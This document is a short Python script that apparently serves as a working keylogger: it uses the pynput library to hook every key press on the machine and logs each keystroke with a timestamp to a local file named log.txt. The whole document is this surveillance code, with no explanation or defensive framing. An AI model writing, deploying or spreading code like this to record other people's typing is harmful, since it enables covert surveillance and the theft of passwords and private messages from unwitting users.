from pynput.keyboard import Listener
import logging

file = "log.txt"
logging.basicConfig(filename = file, level = logging.DEBUG, format = "%(asctime)s %(message)s")

def while_press(key):
    logging.info(key)

with Listener(on_press = while_press) as listener:
    listener.join()